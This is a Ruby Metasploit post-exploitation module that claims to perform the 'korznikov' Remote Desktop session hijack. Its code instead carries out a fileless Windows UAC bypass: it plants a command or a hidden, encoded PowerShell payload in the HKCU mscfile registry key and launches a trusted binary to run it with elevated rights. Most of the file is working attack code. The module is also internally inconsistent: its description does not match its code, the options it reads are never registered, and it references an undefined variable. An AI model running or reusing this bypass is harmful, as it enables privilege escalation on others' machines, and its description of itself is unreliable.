##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : korznikov_session_hijack.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : korznikov
# Tested on      : Windows 2008 | Windows 2012 | Windows 7 | Windows 10
# POC: http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html
#
#
#
# [ DESCRIPTION ]
# A privileged user which can gain command execution with NT AUTHORITY/SYSTEM rights can hijack
# any currently logged in user's session, without any knowledge about his credentials. Terminal
# Services session can be either in connected or disconnected state. This is high risk vulnerability
# which allows any local admin to hijack a session and get access to:
# ---
# 1. Domain admin session.
# 2. Any unsaved documents, that hijacked user works on.
# 3. Any other systems/applications in which hijacked user previously logged in (May include another
# Remote Desktop sessions, Network Share mappings, applications which require another credentials).
# ---
#
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on     => set SESSION 3
# The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
# Check target vulnerability settings/status?  => set CHECK_VULN true
# Delete malicious registry hive keys/values?  => set DEL_REGKEY true
# Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
# The binary.exe vulnerable?                   => set VUL_SOFT CompMgmtLauncher.exe
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/korznikov_session_hijack.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/korznikov_session_hijack.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/korznikov_session_hijack.rb
# msf post(korznikov_session_hijack) > info
# msf post(korznikov_session_hijack) > show options
# msf post(korznikov_session_hijack) > show advanced options
# msf post(korznikov_session_hijack) > set [option(s)]
# msf post(korznikov_session_hijack) > exploit
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - /etc/init.d/postgresql start
# 2 - msfdb delete (optional)
# 3 - msfdb init   (optional)
# 4 - msfconsole
# 5 - reload_all
##




# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'




# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry




# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'korznikov logon session hijack',
                        'Description'   => %q{
                                        A privileged user which can gain command execution with NT AUTHORITY/SYSTEM rights and can hijack any currently logged in user's session without any knowledge about his credentials. Terminal Services session can be either in connected or disconnected state.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln discover: korznikov',                   # vuln discover credits
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'mar 19 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',    # requires a privilege session ..
                        'Targets'        =>
                                [
                                         # Tested againts Windows 10
                                         [ 'Windows 2008', 'Windows 2012', 'Windows 7', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '4', # default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',            # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('HIJACK_ID', [ false, 'Session ID to be hijaced (eg 1)' , false]),
                                OptBool.new('CHECK_USERS', [ false, 'Check available IDs in target system' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('DEL_SERVICE', [ false, 'Delete malicious service created?' , false])
                        ], self.class) 


        end




# -------------------------------------------------------
# GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
# -------------------------------------------------------
def ls_stage1

session = client
# arch = client.fs.file.expand_path("%ComSpec%")
# check target arch (to inject into powershell string)
arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
if arch_check == "C:\\Windows\\SysWOW64"
  arch = "SysWOW64"
else
  arch = "System32"
end

  r=''
  vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
  # vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
  regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
  psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
  psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['EXEC_COMMAND'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set EXEC_COMMAND option!")
    return nil
  else
    print_status("Hijacking #{vul_serve} process!")
    Rex::sleep(1.5)
  end

    # search in target regedit if eventvwr calls mmc.exe
    print_warning("Reading process registry hive keys...")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
      print_good(" exec => remote registry hive key found!")
      Rex::sleep(1.0)
    else
      # registry hive key not found, aborting module execution.
      print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command (mmc.exe call)")
      print_error("[ABORT]: module cant find the registry hive key needed...")
      print_error("System does not appear to be vulnerable to the exploit code!")
      print_line("")
      Rex::sleep(1.0)
      return nil
    end

      # check target UAC settings (always notify - will abort module execution)
      check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
      # a dword:2 value it means 'always notify' setting is active.
      if check_success == 2
        print_warning("Target UAC set to: #{check_success} (always notify)")
        print_error("[ABORT]: module can not work under this condictions...")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      # a dword:nil value it means that we are running againts a 'non-uac-system'
      elsif check_success.nil?
        print_warning("UAC DWORD DATA EMPTY (NON-UAC-SYSTEM?)")
        print_error("[ABORT]: module can not work under this condictions...")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      else
        # all good in UAC settings :D
        print_good(" exec => Target UAC set to: #{check_success} (exploitable)")
        Rex::sleep(1.0)
      end

        #
        # chose to execute a single command in cmd.exe syntax logic
        # or to execute a shellcode(base64) string using powershell.exe
        #
        if datastore['USE_POWERSHELL'] == true
          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
          print_good(" exec => Injecting shellcode(base64) string (powershell.exe)")
          Rex::sleep(1.0)
        else
          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
          print_good(" exec => Injecting cmd command string (cmd.exe)")
          Rex::sleep(1.0)
        end

 # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
 print_good(" exec => Hijacking process to gain code execution...")
 r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit 'enigma0x3' :D
 Rex::sleep(4.5)

      # start remote service to gain code execution
      print_good(" exec => Starting #{vul_serve} native process...")
      r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
      Rex::sleep(1.0)

    # close channel when done
    print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ----------------------------------------------------
# DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
# ----------------------------------------------------
def ls_stage2

  r=''
  session = client
  reg_clean = "REG DELETE HKCU\\Software\\Classes\\mscfile /f" # registry hive to be clean
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DEL_REGKEY'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DEL_REGKEY option!")
    return nil
  else
    print_status("Revert binary.exe process hijack!")
    Rex::sleep(1.5)
  end

    # search in target regedit if hijacking method allready exists
    print_warning("Reading process registry hive keys...")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
      print_good(" exec => Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_warning("Hive key: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
       print_error("[ABORT]: module cant find the registry hive key needed...")
       print_error("System does not appear to be vulnerable to the exploit code!")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

 # Delete hijacking hive keys from target regedit...
 # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
 print_good(" exec => Deleting HKCU hive registry keys...")
 r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit
 Rex::sleep(3.0)

      # check if remote registry hive keys was deleted successefuly
      if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
        print_error("Module can not verify if deletion has successefully!")
      else
        print_status("Registry hive keys deleted successefuly!")
      end

    Rex::sleep(1.0)
    # close channel when done
    print_status("process hijack reverted to default stage!")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end







# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd



    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    | enigma fileless UAC bypass command execution |")
    print_line("    |            Author : r00t-3xp10it             |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals
    # that we are not on a meterpreter session!
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['EXEC_COMMAND']
         ls_stage1
      end

      if datastore['DEL_REGKEY']
         ls_stage2
      end
   end
end
